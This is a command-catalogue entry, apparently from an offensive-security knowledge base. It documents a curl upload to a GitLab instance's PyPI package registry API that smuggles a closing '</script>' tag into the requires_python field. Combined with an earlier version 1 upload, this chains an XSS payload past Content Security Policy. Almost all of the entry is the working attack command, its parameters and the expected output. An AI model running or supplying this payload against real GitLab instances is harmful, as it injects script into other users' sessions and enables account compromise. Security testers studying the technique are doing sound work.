---
id: cmd-upload-pypi-v2-bypass-856836
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F
  name='package_csp_bypass' -F requires_python=' </script>'
tags:
  - xss
  - csp-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.959Z'
verified: false
validated: true
submitted: true
---
# upload-pypi-version2-bypass

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

## Description

Uploads version 2 to close the script tag from version 1, enabling concatenation on the endpoint for CSP bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose | No |
| URL | API endpoint | Yes |
| `-F content` | File | Yes |
| `-F requires_python=2.7` | Overridden | No |
| `-F version=2` | Version | Yes |
| `-F name` | Name | Yes |
| `-F requires_python=payload` | Closing payload | Yes |

## Examples

### Basic Usage

As shown.

### Advanced Usage

Adjust closing tag for different payloads.

## Expected Output

201 Created.

## Related

- [[Related Procedure: Upload-Multi-Version-Packages-for-CSP-Bypass]]
